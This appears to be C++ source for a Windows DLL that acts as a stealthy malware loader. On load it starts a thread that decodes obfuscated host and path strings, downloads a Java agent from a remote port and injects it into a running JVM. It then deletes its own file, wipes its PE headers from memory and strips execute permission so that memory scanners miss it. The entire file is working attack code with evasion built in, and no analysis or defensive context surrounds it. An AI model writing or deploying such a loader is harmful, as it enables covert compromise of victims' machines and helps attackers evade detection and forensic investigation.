// language: C++20, target: Windows 11, MSVC or MinGW-w64

#include <windows.h>
#include "jvm_bridge.h"
#include "downloader.h"
#include "crypt.h"

static HMODULE g_self = nullptr;
static bool g_mapped = false;
static SIZE_T g_image_size = 0;

static void self_cleanup() {
    if (g_mapped) return;

    wchar_t path[MAX_PATH]{};
    if (GetModuleFileNameW(g_self, path, MAX_PATH) > 0) {
        if (!DeleteFileW(path))
            MoveFileExW(path, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
    }
}

// wipe PE headers + reprotect mapped region to hide from memory scanners
static void wipe_mapped_image() {
    if (!g_mapped || !g_self) return;

    auto base = reinterpret_cast<uint8_t*>(g_self);

    // read SizeOfImage from NT headers before we destroy them
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    SIZE_T region_size = g_image_size;
    if (region_size == 0 && dos->e_magic == IMAGE_DOS_SIGNATURE) {
        auto nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);
        region_size = nt->OptionalHeader.SizeOfImage;
    }

    // zero the first page (PE headers — MZ, PE sig, section table)
    // this removes the PE fingerprint from memory
    DWORD old_prot;
    if (VirtualProtect(base, 4096, PAGE_READWRITE, &old_prot)) {
        SecureZeroMemory(base, 4096);
    }

    // downgrade the entire region from RWX to RW
    // removes execute permission — no longer looks like injected code
    if (region_size > 0) {
        VirtualProtect(base, region_size, PAGE_READWRITE, &old_prot);
    }
}

static DWORD WINAPI worker(LPVOID param) {
    Sleep(500 + (GetTickCount() % 300));

    std::vector<uint8_t> payload;

    static constexpr auto enc_host = WENC(L"127.0.0.1");
    static constexpr auto enc_path = WENC(L"/agent.jar");
    auto host = WDEC(enc_host);
    auto path = WDEC(enc_path);
    int port = 8443;

    if (!download_payload(host, path, port, true, payload) || payload.empty()) {
        self_cleanup();
        wipe_mapped_image();
        if (!g_mapped) FreeLibraryAndExitThread(g_self, 0);
        return 0;
    }

    if (!jvm_load_agent(payload.data(), static_cast<int>(payload.size()))) {
        SecureZeroMemory(payload.data(), payload.size());
        self_cleanup();
        wipe_mapped_image();
        if (!g_mapped) FreeLibraryAndExitThread(g_self, 0);
        return 0;
    }

    SecureZeroMemory(payload.data(), payload.size());
    payload.clear();

    self_cleanup();

    // agent is loaded into JVM — DLL memory no longer needed
    // wipe PE signature and drop execute permission
    wipe_mapped_image();

    Sleep(50);
    if (!g_mapped) FreeLibraryAndExitThread(g_self, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        g_self = hModule;
        g_mapped = (reinterpret_cast<uintptr_t>(reserved) == 0x4D4D);

        // cache image size before anything touches the headers
        if (g_mapped) {
            auto base = reinterpret_cast<uint8_t*>(hModule);
            auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
            if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                auto nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);
                g_image_size = nt->OptionalHeader.SizeOfImage;
            }
        }

        HANDLE t = CreateThread(nullptr, 0, worker, nullptr, 0, nullptr);
        if (t) CloseHandle(t);
    }
    return TRUE;
}
